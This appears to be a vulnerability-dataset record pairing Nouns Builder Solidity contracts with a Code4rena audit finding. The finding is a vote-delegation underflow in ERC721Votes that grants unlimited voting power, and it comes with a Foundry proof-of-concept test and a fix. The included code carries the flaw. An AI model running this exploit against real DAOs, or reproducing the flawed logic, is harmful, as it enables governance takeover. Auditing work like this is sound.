[
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n/// @title IERC721\n/// @author Rohan Kulkarni\n/// @notice The external ERC721 events, errors, and functions\ninterface IERC721 {\n    ///                                                          ///\n    ///                            EVENTS                        ///\n    ///                                                          ///\n\n    /// @notice Emitted when a token is transferred from sender to recipient\n    /// @param from The sender address\n    /// @param to The recipient address\n    /// @param tokenId The ERC-721 token id\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n\n    /// @notice Emitted when an owner approves an account to manage a token\n    /// @param owner The owner address\n    /// @param approved The account address\n    /// @param tokenId The ERC-721 token id\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n\n    /// @notice Emitted when an owner sets an approval for a spender to manage all tokens\n    /// @param owner The owner address\n    /// @param operator The spender address\n    /// @param approved If the approval is being set or removed\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n\n    ///                                                          ///\n    ///                            ERRORS                        ///\n    ///                                                          ///\n\n    /// @dev Reverts if a caller is not authorized to approve or transfer a token\n    error INVALID_APPROVAL();\n\n    /// @dev Reverts if a transfer is called with the incorrect token owner\n    error INVALID_OWNER();\n\n    /// @dev Reverts if a transfer is attempted to address(0)\n    error INVALID_RECIPIENT();\n\n    /// @dev Reverts if an existing token is called to be minted\n    error ALREADY_MINTED();\n\n    /// @dev Reverts if a non-existent token is called to be burned\n    error NOT_MINTED();\n\n    ///                                                          ///\n    ///                           FUNCTIONS                      ///\n    ///                                                          ///\n\n    /// @notice The number of tokens owned\n    /// @param owner The owner address\n    function balanceOf(address owner) external view returns (uint256);\n\n    /// @notice The owner of a token\n    /// @param tokenId The ERC-721 token id\n    function ownerOf(uint256 tokenId) external view returns (address);\n\n    /// @notice The account approved to manage a token\n    /// @param tokenId The ERC-721 token id\n    function getApproved(uint256 tokenId) external view returns (address);\n\n    /// @notice If an operator is authorized to manage all of an owner's tokens\n    /// @param owner The owner address\n    /// @param operator The operator address\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n\n    /// @notice Authorizes an account to manage a token\n    /// @param to The account address\n    /// @param tokenId The ERC-721 token id\n    function approve(address to, uint256 tokenId) external;\n\n    /// @notice Authorizes an account to manage all tokens\n    /// @param operator The account address\n    /// @param approved If permission is being given or removed\n    function setApprovalForAll(address operator, bool approved) external;\n\n    /// @notice Safe transfers a token from sender to recipient with additional data\n    /// @param from The sender address\n    /// @param to The recipient address\n    /// @param tokenId The ERC-721 token id\n    /// @param data The additional data sent in the call to the recipient\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes calldata data\n    ) external;\n\n    /// @notice Safe transfers a token from sender to recipient\n    /// @param from The sender address\n    /// @param to The recipient address\n    /// @param tokenId The ERC-721 token id\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    /// @notice Transfers a token from sender to recipient\n    /// @param from The sender address\n    /// @param to The recipient address\n    /// @param tokenId The ERC-721 token id\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { UUPS } from \"../lib/proxy/UUPS.sol\";\nimport { Ownable } from \"../lib/utils/Ownable.sol\";\nimport { ReentrancyGuard } from \"../lib/utils/ReentrancyGuard.sol\";\nimport { Pausable } from \"../lib/utils/Pausable.sol\";\nimport { SafeCast } from \"../lib/utils/SafeCast.sol\";\n\nimport { AuctionStorageV1 } from \"./storage/AuctionStorageV1.sol\";\nimport { Token } from \"../token/Token.sol\";\nimport { IManager } from \"../manager/IManager.sol\";\nimport { IAuction } from \"./IAuction.sol\";\nimport { IWETH } from \"../lib/interfaces/IWETH.sol\";\n\n/// @title Auction\n/// @author Rohan Kulkarni\n/// @notice A DAO's auction house\n/// Modified from:\n/// - NounsAuctionHouse.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Zora V3 ReserveAuctionCoreEth module commit 795aeca - licensed under the GPL-3.0 license.\ncontract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionStorageV1 {\n    ///                                                          ///\n    ///                          IMMUTABLES                      ///\n    ///                                                          ///\n\n    /// @notice The address of WETH\n    address private immutable WETH;\n\n    /// @notice The contract upgrade manager\n    IManager private immutable manager;\n\n    ///                                                          ///\n    ///                          CONSTRUCTOR                     ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    /// @param _weth The address of WETH\n    constructor(address _manager, address _weth) payable initializer {\n        manager = IManager(_manager);\n        WETH = _weth;\n    }\n\n    ///                                                          ///\n    ///                          INITIALIZER                     ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's auction contract\n    /// @param _token The ERC-721 token address\n    /// @param _founder The founder responsible for starting the first auction\n    /// @param _treasury The treasury address where ETH will be sent\n    /// @param _duration The duration of each auction\n    /// @param _reservePrice The reserve price of each auction\n    function initialize(\n        address _token,\n        address _founder,\n        address _treasury,\n        uint256 _duration,\n        uint256 _reservePrice\n    ) external initializer {\n        // Ensure the caller is the contract manager\n        if (msg.sender != address(manager)) revert ONLY_MANAGER();\n\n        // Initialize the reentrancy guard\n        __ReentrancyGuard_init();\n\n        // Grant initial ownership to a founder\n        __Ownable_init(_founder);\n\n        // Pause the contract until the first auction\n        __Pausable_init(true);\n\n        // Store DAO's ERC-721 token\n        token = Token(_token);\n\n        // Store the auction house settings\n        settings.duration = SafeCast.toUint40(_duration);\n        settings.reservePrice = _reservePrice;\n        settings.treasury = _treasury;\n        settings.timeBuffer = 5 minutes;\n        settings.minBidIncrement = 10;\n    }\n\n    ///                                                          ///\n    ///                          CREATE BID                      ///\n    ///                                                          ///\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function createBid(uint256 _tokenId) external payable nonReentrant {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the bid is for the current token\n        if (_auction.tokenId != _tokenId) revert INVALID_TOKEN_ID();\n\n        // Ensure the auction is still active\n        if (block.timestamp >= _auction.endTime) revert AUCTION_OVER();\n\n        // Cache the address of the highest bidder\n        address highestBidder = _auction.highestBidder;\n\n        // If this is the first bid:\n        if (highestBidder == address(0)) {\n            // Ensure the bid meets the reserve price\n            if (msg.value < settings.reservePrice) revert RESERVE_PRICE_NOT_MET();\n\n            // Else this is a subsequent bid:\n        } else {\n            // Cache the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // Used to store the minimum bid required\n            uint256 minBid;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the minimum bid\n                minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100);\n            }\n\n            // Ensure the incoming bid meets the minimum\n            if (msg.value < minBid) revert MINIMUM_BID_NOT_MET();\n\n            // Refund the previous bidder\n            _handleOutgoingTransfer(highestBidder, highestBid);\n        }\n\n        // Store the new highest bid\n        auction.highestBid = msg.value;\n\n        // Store the new highest bidder\n        auction.highestBidder = msg.sender;\n\n        // Used to store if the auction will be extended\n        bool extend;\n\n        // Cannot underflow as `_auction.endTime` is ensured to be greater than the current time above\n        unchecked {\n            // Compute whether the time remaining is less than the buffer\n            extend = (_auction.endTime - block.timestamp) < settings.timeBuffer;\n        }\n\n        // If the time remaining is within the buffer:\n        if (extend) {\n            // Cannot realistically overflow\n            unchecked {\n                // Extend the auction by the time buffer\n                auction.endTime = uint40(block.timestamp + settings.timeBuffer);\n            }\n        }\n\n        emit AuctionBid(_tokenId, msg.sender, msg.value, extend, auction.endTime);\n    }\n\n    ///                                                          ///\n    ///                    SETTLE & CREATE AUCTION               ///\n    ///                                                          ///\n\n    /// @notice Settles the current auction and creates the next one\n    function settleCurrentAndCreateNewAuction() external nonReentrant whenNotPaused {\n        _settleAuction();\n        _createAuction();\n    }\n\n    /// @dev Settles the current auction\n    function _settleAuction() private {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the auction wasn't already settled\n        if (auction.settled) revert AUCTION_SETTLED();\n\n        // Ensure the auction had started\n        if (_auction.startTime == 0) revert AUCTION_NOT_STARTED();\n\n        // Ensure the auction is over\n        if (block.timestamp < _auction.endTime) revert AUCTION_ACTIVE();\n\n        // Mark the auction as settled\n        auction.settled = true;\n\n        // If a bid was placed:\n        if (_auction.highestBidder != address(0)) {\n            // Cache the amount of the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // If the highest bid included ETH: Transfer it to the DAO treasury\n            if (highestBid != 0) _handleOutgoingTransfer(settings.treasury, highestBid);\n\n            // Transfer the token to the highest bidder\n            token.transferFrom(address(this), _auction.highestBidder, _auction.tokenId);\n\n            // Else no bid was placed:\n        } else {\n            // Burn the token\n            token.burn(_auction.tokenId);\n        }\n\n        emit AuctionSettled(_auction.tokenId, _auction.highestBidder, _auction.highestBid);\n    }\n\n    /// @dev Creates an auction for the next token\n    function _createAuction() private {\n        // Get the next token available for bidding\n        try token.mint() returns (uint256 tokenId) {\n            // Store the token id\n            auction.tokenId = tokenId;\n\n            // Cache the current timestamp\n            uint256 startTime = block.timestamp;\n\n            // Used to store the auction end time\n            uint256 endTime;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the auction end time\n                endTime = startTime + settings.duration;\n            }\n\n            // Store the auction start and end time\n            auction.startTime = uint40(startTime);\n            auction.endTime = uint40(endTime);\n\n            // Reset data from the previous auction\n            auction.highestBid = 0;\n            auction.highestBidder = address(0);\n            auction.settled = false;\n\n            emit AuctionCreated(tokenId, startTime, endTime);\n\n            // Pause the contract if token minting failed\n        } catch Error(string memory) {\n            _pause();\n        }\n    }\n\n    ///                                                          ///\n    ///                             PAUSE                        ///\n    ///                                                          ///\n\n    /// @notice Unpauses the auction house\n    function unpause() external onlyOwner {\n        _unpause();\n\n        // If this is the first auction:\n        if (auction.tokenId == 0) {\n            // Transfer ownership of the contract to the DAO\n            transferOwnership(settings.treasury);\n\n            // Start the first auction\n            _createAuction();\n        }\n        // Else if the contract was paused and the previous auction was settled:\n        else if (auction.settled) {\n            // Start the next auction\n            _createAuction();\n        }\n    }\n\n    /// @notice Pauses the auction house\n    function pause() external onlyOwner {\n        _pause();\n    }\n\n    /// @notice Settles the latest auction when the contract is paused\n    function settleAuction() external nonReentrant whenPaused {\n        _settleAuction();\n    }\n\n    ///                                                          ///\n    ///                       AUCTION SETTINGS                   ///\n    ///                                                          ///\n\n    /// @notice The DAO treasury\n    function treasury() external view returns (address) {\n        return settings.treasury;\n    }\n\n    /// @notice The time duration of each auction\n    function duration() external view returns (uint256) {\n        return settings.duration;\n    }\n\n    /// @notice The reserve price of each auction\n    function reservePrice() external view returns (uint256) {\n        return settings.reservePrice;\n    }\n\n    /// @notice The minimum amount of time to place a bid during an active auction\n    function timeBuffer() external view returns (uint256) {\n        return settings.timeBuffer;\n    }\n\n    /// @notice The minimum percentage an incoming bid must raise the highest bid\n    function minBidIncrement() external view returns (uint256) {\n        return settings.minBidIncrement;\n    }\n\n    ///                                                          ///\n    ///                       UPDATE SETTINGS                    ///\n    ///                                                          ///\n\n    /// @notice Updates the time duration of each auction\n    /// @param _duration The new time duration\n    function setDuration(uint256 _duration) external onlyOwner {\n        settings.duration = SafeCast.toUint40(_duration);\n\n        emit DurationUpdated(_duration);\n    }\n\n    /// @notice Updates the reserve price of each auction\n    /// @param _reservePrice The new reserve price\n    function setReservePrice(uint256 _reservePrice) external onlyOwner {\n        settings.reservePrice = _reservePrice;\n\n        emit ReservePriceUpdated(_reservePrice);\n    }\n\n    /// @notice Updates the time buffer of each auction\n    /// @param _timeBuffer The new time buffer\n    function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {\n        settings.timeBuffer = SafeCast.toUint40(_timeBuffer);\n\n        emit TimeBufferUpdated(_timeBuffer);\n    }\n\n    /// @notice Updates the minimum bid increment of each subsequent bid\n    /// @param _percentage The new percentage\n    function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {\n        settings.minBidIncrement = SafeCast.toUint8(_percentage);\n\n        emit MinBidIncrementPercentageUpdated(_percentage);\n    }\n\n    ///                                                          ///\n    ///                        TRANSFER UTIL                     ///\n    ///                                                          ///\n\n    /// @notice Transfer ETH/WETH from the contract\n    /// @param _to The recipient address\n    /// @param _amount The amount transferring\n    function _handleOutgoingTransfer(address _to, uint256 _amount) private {\n        // Ensure the contract has enough ETH to transfer\n        if (address(this).balance < _amount) revert INSOLVENT();\n\n        // Used to store if the transfer succeeded\n        bool success;\n\n        assembly {\n            // Transfer ETH to the recipient\n            // Limit the call to 50,000 gas\n            success := call(50000, _to, _amount, 0, 0, 0, 0)\n        }\n\n        // If the transfer failed:\n        if (!success) {\n            // Wrap as WETH\n            IWETH(WETH).deposit{ value: _amount }();\n\n            // Transfer WETH instead\n            IWETH(WETH).transfer(_to, _amount);\n        }\n    }\n\n    ///                                                          ///\n    ///                        AUCTION UPGRADE                   ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {\n        // Ensure the new implementation is registered by the Builder DAO\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}\n\n\n",
        "CodeNames": [
            "IERC721.sol",
            "Auction.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "balanceOf(user",
                    "balanceOf(from)",
                    "_to"
                ],
                "Type": " User can get unlimited votes",
                "Description": "*Submitted by saian, also found by 0x4non, Ch_301, davidbrai, izhuer, MEP, Picodes, PwnPatrol, R2, rotcivegaf, scaraven, and Soosh*\n\naftertokenTransfer in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in _moveDelegates and get unlimited votes.\n\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268\n\n        function _afterTokenTransfer(\n            address _from,\n            address _to,\n            uint256 _tokenId\n        ) internal override {\n            // Transfer 1 vote from the sender to the recipient\n            _moveDelegateVotes(_from, _to, 1);\n\n            super._afterTokenTransfer(_from, _to, _tokenId);\n        }\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216\n\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n        ...\n        unchecked {\n                    ...\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes _amount);\n                }\n\nDuring delegation balanceOf(from) amount of votes transferred are to the _to address\n\n        function test_UserCanGetUnlimitedVotes() public {\n\n            vm.prank(founder);\n            auction.unpause();\n\n            vm.prank(bidder1);\n            auction.createBid{ value: 1 ether }(2);\n\n            vm.warp(10 minutes + 1 seconds);\n\n            auction.settleCurrentAndCreateNewAuction();\n            \n            assertEq(token.ownerOf(2), bidder1);\n\n            console.log(token.getVotes(bidder1)); // 1\n            console.log(token.delegates(bidder1)); // 0 bidder1\n\n            vm.prank(bidder1);\n            token.delegate(bidder2);\n\n            console.log(token.getVotes(bidder1)); // 1\n            console.log(token.getVotes(bidder2)); // 1\n\n            vm.prank(bidder1);\n            auction.createBid{value: 1 ether}(3);\n\n            vm.warp(22 minutes);\n\n            auction.settleCurrentAndCreateNewAuction();\n\n            assertEq(token.ownerOf(3), bidder1);\n\n            console.log(token.balanceOf(bidder1)); // 2\n            console.log(token.getVotes(bidder1)); // 2\n            console.log(token.getVotes(bidder2)); // 1\n\n            vm.prank(bidder1);        \n            token.delegate(bidder1);\n\n            console.log(token.getVotes(bidder1)); // 4\n            console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895     \n      }\n\nWhen user1 delegates to another address balanceOf(user1) amount of tokens are subtraced from user2's votes, this will cause underflow and not revert since the statements are unchecked\n\n\nFoundry\n\n",
                "Repair": "\nChange delegate transfer in afterTokenTransfer to\n\n            _moveDelegateVotes(delegates(_from), delegates(_to), 1);\n\nAlex the Entreprenerd (judge) increased severity to High and commented(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469#issuecomment-1257276491):\n  The warden has shown how to exploit:\n An unchecked section of the code\n An incorrect logic in moving tokenDelegation\n \n To trigger an underflow that gives each user the maximum voting power.\n \n While some setup is necessary (having 1 token), I think the exploit is impactful enough to warrant High Severity, as any attacker will be able to obtain infinite voting power on multiple accounts.\n\n In contrast to other reports, this finding (as well as it's duplicates) are using an unchecked operation to negatively overflow the amount of votes to gain the maximum value.\n\ntbtstl (Nouns Builder) confirmed(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport { IERC721Votes } from \"../interfaces/IERC721Votes.sol\";\nimport { ERC721 } from \"../token/ERC721.sol\";\nimport { EIP712 } from \"../utils/EIP712.sol\";\n\n/// @title ERC721Votes\n/// @author Rohan Kulkarni\n/// @notice Modified from OpenZeppelin Contracts v4.7.3 (token/ERC721/extensions/draft-ERC721Votes.sol) & Nouns DAO ERC721Checkpointable.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Uses custom errors defined in IERC721Votes\n/// - Checkpoints are based on timestamps instead of block numbers\n/// - Tokens are self-delegated by default\n/// - The total number of votes is the token supply itself\nabstract contract ERC721Votes is IERC721Votes, EIP712, ERC721 {\n    ///                                                          ///\n    ///                          CONSTANTS                       ///\n    ///                                                          ///\n\n    /// @dev The EIP-712 typehash to delegate with a signature\n    bytes32 internal constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address from,address to,uint256 nonce,uint256 deadline)\");\n\n    ///                                                          ///\n    ///                           STORAGE                        ///\n    ///                                                          ///\n\n    /// @notice The delegate for an account\n    /// @notice Account => Delegate\n    mapping(address => address) internal delegation;\n\n    /// @notice The number of checkpoints for an account\n    /// @dev Account => Num Checkpoints\n    mapping(address => uint256) internal numCheckpoints;\n\n    /// @notice The checkpoint for an account\n    /// @dev Account => Checkpoint Id => Checkpoint\n    mapping(address => mapping(uint256 => Checkpoint)) internal checkpoints;\n\n    ///                                                          ///\n    ///                        VOTING WEIGHT                     ///\n    ///                                                          ///\n\n    /// @notice The current number of votes for an account\n    /// @param _account The account address\n    function getVotes(address _account) public view returns (uint256) {\n        // Get the account's number of checkpoints\n        uint256 nCheckpoints = numCheckpoints[_account];\n\n        // Cannot underflow as `nCheckpoints` is ensured to be greater than 0 if reached\n        unchecked {\n            // Return the number of votes at the latest checkpoint if applicable\n            return nCheckpoints != 0 ? checkpoints[_account][nCheckpoints - 1].votes : 0;\n        }\n    }\n\n    /// @notice The number of votes for an account at a past timestamp\n    /// @param _account The account address\n    /// @param _timestamp The past timestamp\n    function getPastVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n        // Ensure the given timestamp is in the past\n        if (_timestamp >= block.timestamp) revert INVALID_TIMESTAMP();\n\n        // Get the account's number of checkpoints\n        uint256 nCheckpoints = numCheckpoints[_account];\n\n        // If there are none return 0\n        if (nCheckpoints == 0) return 0;\n\n        // Get the account's checkpoints\n        mapping(uint256 => Checkpoint) storage accountCheckpoints = checkpoints[_account];\n\n        unchecked {\n            // Get the latest checkpoint id\n            // Cannot underflow as `nCheckpoints` is ensured to be greater than 0\n            uint256 lastCheckpoint = nCheckpoints - 1;\n\n            // If the latest checkpoint has a valid timestamp, return its number of votes\n            if (accountCheckpoints[lastCheckpoint].timestamp <= _timestamp) return accountCheckpoints[lastCheckpoint].votes;\n\n            // If the first checkpoint doesn't have a valid timestamp, return 0\n            if (accountCheckpoints[0].timestamp > _timestamp) return 0;\n\n            // Otherwise, find a checkpoint with a valid timestamp\n            // Use the latest id as the initial upper bound\n            uint256 high = lastCheckpoint;\n            uint256 low;\n            uint256 middle;\n\n            // Used to temporarily hold a checkpoint\n            Checkpoint memory cp;\n\n            // While a valid checkpoint is to be found:\n            while (high > low) {\n                // Find the id of the middle checkpoint\n                middle = high - (high - low) / 2;\n\n                // Get the middle checkpoint\n                cp = accountCheckpoints[middle];\n\n                // If the timestamp is a match:\n                if (cp.timestamp == _timestamp) {\n                    // Return the voting weight\n                    return cp.votes;\n\n                    // Else if the timestamp is before the one looking for:\n                } else if (cp.timestamp < _timestamp) {\n                    // Update the lower bound\n                    low = middle;\n\n                    // Else update the upper bound\n                } else {\n                    high = middle - 1;\n                }\n            }\n\n            return accountCheckpoints[low].votes;\n        }\n    }\n\n    ///                                                          ///\n    ///                          DELEGATION                      ///\n    ///                                                          ///\n\n    /// @notice The delegate for an account\n    /// @param _account The account address\n    function delegates(address _account) external view returns (address) {\n        address current = delegation[_account];\n        return current == address(0) ? _account : current;\n    }\n\n    /// @notice Delegates votes to an account\n    /// @param _to The address delegating votes to\n    function delegate(address _to) external {\n        _delegate(msg.sender, _to);\n    }\n\n    /// @notice Delegates votes from a signer to an account\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _deadline The signature deadline\n    /// @param _v The 129th byte and chain id of the signature\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function delegateBySig(\n        address _from,\n        address _to,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        // Ensure the signature has not expired\n        if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();\n\n        // Used to store the digest\n        bytes32 digest;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the hash of the domain seperator with the typed delegation data\n            digest = keccak256(\n                abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))\n            );\n        }\n\n        // Recover the message signer\n        address recoveredAddress = ecrecover(digest, _v, _r, _s);\n\n        // Ensure the recovered signer is the voter\n        if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();\n\n        // Update the delegate\n        _delegate(_from, _to);\n    }\n\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n\n    /// @dev Transfers voting weight\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _amount The number of votes delegating\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount > 0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n            }\n        }\n    }\n\n    /// @dev Records a checkpoint\n    /// @param _account The account address\n    /// @param _id The checkpoint id\n    /// @param _prevTotalVotes The account's previous voting weight\n    /// @param _newTotalVotes The account's new voting weight\n    function _writeCheckpoint(\n        address _account,\n        uint256 _id,\n        uint256 _prevTotalVotes,\n        uint256 _newTotalVotes\n    ) private {\n        // Get the pointer to store the checkpoint\n        Checkpoint storage checkpoint = checkpoints[_account][_id];\n\n        // Record the updated voting weight and current time\n        checkpoint.votes = uint192(_newTotalVotes);\n        checkpoint.timestamp = uint64(block.timestamp);\n\n        emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes);\n    }\n\n    /// @dev Enables each NFT to equal 1 vote\n    /// @param _from The token sender\n    /// @param _to The token recipient\n    /// @param _tokenId The ERC-721 token id\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n\n        super._afterTokenTransfer(_from, _to, _tokenId);\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport { IERC721 } from \"../interfaces/IERC721.sol\";\nimport { Initializable } from \"../utils/Initializable.sol\";\nimport { ERC721TokenReceiver } from \"../utils/TokenReceiver.sol\";\nimport { Address } from \"../utils/Address.sol\";\n\n/// @title ERC721\n/// @author Rohan Kulkarni\n/// @notice Modified from OpenZeppelin Contracts v4.7.3 (token/ERC721/ERC721Upgradeable.sol)\n/// - Uses custom errors declared in IERC721\nabstract contract ERC721 is IERC721, Initializable {\n    ///                                                          ///\n    ///                            STORAGE                       ///\n    ///                                                          ///\n\n    /// @notice The token name\n    string public name;\n\n    /// @notice The token symbol\n    string public symbol;\n\n    /// @notice The token owners\n    /// @dev ERC-721 token id => Owner\n    mapping(uint256 => address) internal owners;\n\n    /// @notice The owner balances\n    /// @dev Owner => Balance\n    mapping(address => uint256) internal balances;\n\n    /// @notice The token approvals\n    /// @dev ERC-721 token id => Manager\n    mapping(uint256 => address) internal tokenApprovals;\n\n    /// @notice The balance approvals\n    /// @dev Owner => Operator => Approved\n    mapping(address => mapping(address => bool)) internal operatorApprovals;\n\n    ///                                                          ///\n    ///                           FUNCTIONS                      ///\n    ///                                                          ///\n\n    /// @dev Initializes an ERC-721 token\n    /// @param _name The ERC-721 token name\n    /// @param _symbol The ERC-721 token symbol\n    function __ERC721_init(string memory _name, string memory _symbol) internal onlyInitializing {\n        name = _name;\n        symbol = _symbol;\n    }\n\n    /// @notice The token URI\n    /// @param _tokenId The ERC-721 token id\n    function tokenURI(uint256 _tokenId) public view virtual returns (string memory) {}\n\n    /// @notice The contract URI\n    function contractURI() public view virtual returns (string memory) {}\n\n    /// @notice If the contract implements an interface\n    /// @param _interfaceId The interface id\n    function supportsInterface(bytes4 _interfaceId) external pure returns (bool) {\n        return\n            _interfaceId == 0x01ffc9a7 || // ERC165 Interface ID\n            _interfaceId == 0x80ac58cd || // ERC721 Interface ID\n            _interfaceId == 0x5b5e139f; // ERC721Metadata Interface ID\n    }\n\n    /// @notice The account approved to manage a token\n    /// @param _tokenId The ERC-721 token id\n    function getApproved(uint256 _tokenId) external view returns (address) {\n        return tokenApprovals[_tokenId];\n    }\n\n    /// @notice If an operator is authorized to manage all of an owner's tokens\n    /// @param _owner The owner address\n    /// @param _operator The operator address\n    function isApprovedForAll(address _owner, address _operator) external view returns (bool) {\n        return operatorApprovals[_owner][_operator];\n    }\n\n    /// @notice The number of tokens owned\n    /// @param _owner The owner address\n    function balanceOf(address _owner) public view returns (uint256) {\n        if (_owner == address(0)) revert ADDRESS_ZERO();\n\n        return balances[_owner];\n    }\n\n    /// @notice The owner of a token\n    /// @param _tokenId The ERC-721 token id\n    function ownerOf(uint256 _tokenId) public view returns (address) {\n        address owner = owners[_tokenId];\n\n        if (owner == address(0)) revert INVALID_OWNER();\n\n        return owner;\n    }\n\n    /// @notice Authorizes an account to manage a token\n    /// @param _to The account address\n    /// @param _tokenId The ERC-721 token id\n    function approve(address _to, uint256 _tokenId) external {\n        address owner = owners[_tokenId];\n\n        if (msg.sender != owner && !operatorApprovals[owner][msg.sender]) revert INVALID_APPROVAL();\n\n        tokenApprovals[_tokenId] = _to;\n\n        emit Approval(owner, _to, _tokenId);\n    }\n\n    /// @notice Authorizes an account to manage all tokens\n    /// @param _operator The account address\n    /// @param _approved If permission is being given or removed\n    function setApprovalForAll(address _operator, bool _approved) external {\n        operatorApprovals[msg.sender][_operator] = _approved;\n\n        emit ApprovalForAll(msg.sender, _operator, _approved);\n    }\n\n    /// @notice Transfers a token from sender to recipient\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) public {\n        if (_from != owners[_tokenId]) revert INVALID_OWNER();\n\n        if (_to == address(0)) revert ADDRESS_ZERO();\n\n        if (msg.sender != _from && !operatorApprovals[_from][msg.sender] && msg.sender != tokenApprovals[_tokenId]) revert INVALID_APPROVAL();\n\n        _beforeTokenTransfer(_from, _to, _tokenId);\n\n        unchecked {\n            --balances[_from];\n\n            ++balances[_to];\n        }\n\n        owners[_tokenId] = _to;\n\n        delete tokenApprovals[_tokenId];\n\n        emit Transfer(_from, _to, _tokenId);\n\n        _afterTokenTransfer(_from, _to, _tokenId);\n    }\n\n    /// @notice Safe transfers a token from sender to recipient\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) external {\n        transferFrom(_from, _to, _tokenId);\n\n        if (\n            Address.isContract(_to) 